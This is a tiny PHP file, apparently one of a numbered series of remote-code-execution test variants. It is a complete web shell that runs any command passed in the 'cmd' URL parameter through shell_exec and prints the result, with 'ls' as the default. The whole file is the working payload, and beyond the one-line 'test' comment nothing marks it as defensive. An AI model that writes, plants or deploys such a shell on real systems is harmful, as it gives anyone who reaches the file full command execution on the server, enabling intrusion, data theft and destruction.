<?php
// RCE test variation #694
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>